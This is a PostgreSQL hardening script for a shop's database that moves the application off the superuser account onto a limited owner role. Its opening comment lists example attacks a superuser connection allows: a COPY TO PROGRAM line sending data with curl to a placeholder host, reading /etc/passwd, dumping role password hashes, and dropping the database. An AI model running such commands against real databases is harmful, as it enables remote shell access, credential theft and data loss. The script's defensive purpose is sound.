-- Take the superuser away from the application.
--
-- Run once, on the VPS, as postgres. Safe to re-run.
--
-- ─────────────────────────────────────────────────────────────────────────────
-- Why this matters more than it looks
--
-- The API connects to Postgres as `postgres`, the cluster superuser. Every
-- query in the code is parameterised and none of them can be injected today -
-- that was checked line by line, and backend/Scripts/check-sql.py now keeps it
-- that way. But parameterised queries are the first half of the answer and
-- this is the second, because the two protect against different things.
--
-- Parameterisation stops input from becoming SQL. This limits what SQL can do
-- if it ever gets through - through an injection somebody missed, a dependency
-- with a hole in it, or a mistake in a query written at five in the evening.
--
-- As a superuser, SQL is not limited to the data. It can:
--
--   COPY orders TO PROGRAM 'curl -d @- http://somewhere'
--     COPY ... PROGRAM runs a SHELL COMMAND on the VPS as the postgres user.
--     An injection against a superuser connection is not a data breach, it is
--     a shell on the server.
--
--   COPY (SELECT ...) FROM '/etc/passwd'   -- read any file the server can
--   SELECT * FROM pg_authid                -- every role's password hash
--   ALTER ROLE postgres PASSWORD '...'     -- take the cluster
--   DROP DATABASE mahalaxmi_fashionhub     -- end the shop
--
-- A non-superuser role that merely owns its own tables can do none of those.
-- The worst case shrinks from "the server" to "this one database", which is
-- the difference between a bad week and a closed shop.
--
-- ─────────────────────────────────────────────────────────────────────────────
-- Why it OWNS the tables rather than just having select/insert/update/delete
--
-- Because this app manages its own schema: Program.cs runs CREATE TABLE IF NOT
-- EXISTS, CREATE INDEX IF NOT EXISTS and CREATE SEQUENCE on every startup (no
-- EF migrations are used). CREATE INDEX requires ownership of the table, so a
-- role with only data rights would fail at boot.
--
-- Ownership of its own tables is still an enormous reduction. The superuser
-- powers above are not table privileges at all; they belong to the role, and
-- this role does not have them.
--
-- ─────────────────────────────────────────────────────────────────────────────
-- Steps
--
--   1. Pick a long random password.
--   2. psql -U postgres -d mahalaxmi_fashionhub -v app_password="'<the password>'" \
--        -f least-privilege.sql
--   3. Put it in the stack's .env as APP_DB_USER=mfh_app and
--      APP_DB_PASSWORD=<the password>, then restart the backend.
--   4. The startup log should now say the database user is not a superuser.
--
-- On a FRESH install, database/schema.sql runs as postgres and the tables are
-- owned by postgres again, so this script has to be run once more afterwards.
-- ─────────────────────────────────────────────────────────────────────────────

\set ON_ERROR_STOP on

-- 1. The role, created if missing and given the password either way, so
--    re-running this script repairs rather than fails.
--
--    Deliberately NOT inside a DO $$ ... $$ block: psql does not substitute
--    its own variables inside dollar-quoted text, so :'app_password' in there
--    would be sent to the server literally and the role would end up with the
--    password :'app_password'. It has to be interpolated at the top level.
SELECT NOT EXISTS (SELECT 1 FROM pg_roles WHERE rolname = 'mfh_app') AS need_role \gset

\if :need_role
CREATE ROLE mfh_app LOGIN PASSWORD :'app_password';
\echo 'role mfh_app created'
\else
ALTER ROLE mfh_app LOGIN PASSWORD :'app_password';
\echo 'role mfh_app already existed - password set'
\endif

-- Say out loud what it is NOT. These are the defaults for a new role; the
-- statement is here so that re-running this script repairs a role somebody
-- granted something to in the meantime.
ALTER ROLE mfh_app NOSUPERUSER NOCREATEDB NOCREATEROLE NOREPLICATION NOBYPASSRLS;

-- 2. Let it in, and nobody else.
GRANT CONNECT ON DATABASE mahalaxmi_fashionhub TO mfh_app;
REVOKE ALL ON DATABASE mahalaxmi_fashionhub FROM PUBLIC;

-- USAGE to see the schema, CREATE because startup creates tables in it.
GRANT USAGE, CREATE ON SCHEMA public TO mfh_app;
REVOKE CREATE ON SCHEMA public FROM PUBLIC;

-- 3. Hand the existing objects over.
--
--    format() with %I, not string concatenation. Identifiers cannot be passed
--    as parameters, so this is the one place where SQL has to be built as
--    text - and %I is what quotes an identifier correctly. It is the same
--    lesson as the application code: the value never becomes syntax by accident.
DO $$
DECLARE
    r record;
    n int := 0;
BEGIN
    FOR r IN SELECT tablename FROM pg_tables WHERE schemaname = 'public' LOOP
        EXECUTE format('ALTER TABLE public.%I OWNER TO mfh_app', r.tablename);
        n := n + 1;
    END LOOP;
    RAISE NOTICE '% tables handed over', n;

    n := 0;
    FOR r IN SELECT sequencename FROM pg_sequences WHERE schemaname = 'public' LOOP
        EXECUTE format('ALTER SEQUENCE public.%I OWNER TO mfh_app', r.sequencename);
        n := n + 1;
    END LOOP;
    RAISE NOTICE '% sequences handed over', n;

    n := 0;
    FOR r IN SELECT viewname FROM pg_views WHERE schemaname = 'public' LOOP
        EXECUTE format('ALTER VIEW public.%I OWNER TO mfh_app', r.viewname);
        n := n + 1;
    END LOOP;
    RAISE NOTICE '% views handed over', n;
END $$;

-- 4. Anything postgres creates here later - a hand-run fix, a restored
--    backup - is usable by the app without this script being run again.
ALTER DEFAULT PRIVILEGES IN SCHEMA public
    GRANT SELECT, INSERT, UPDATE, DELETE ON TABLES TO mfh_app;
ALTER DEFAULT PRIVILEGES IN SCHEMA public
    GRANT USAGE, SELECT, UPDATE ON SEQUENCES TO mfh_app;

-- 5. What it ended up with. Read this before restarting the backend.
SELECT
    rolname        AS role,
    rolsuper       AS is_superuser,
    rolcreatedb    AS can_create_db,
    rolcreaterole  AS can_create_roles,
    rolbypassrls   AS bypasses_row_security
FROM pg_roles
WHERE rolname IN ('postgres', 'mfh_app')
ORDER BY rolname;

SELECT count(*) AS tables_owned_by_app
FROM pg_tables
WHERE schemaname = 'public' AND tableowner = 'mfh_app';
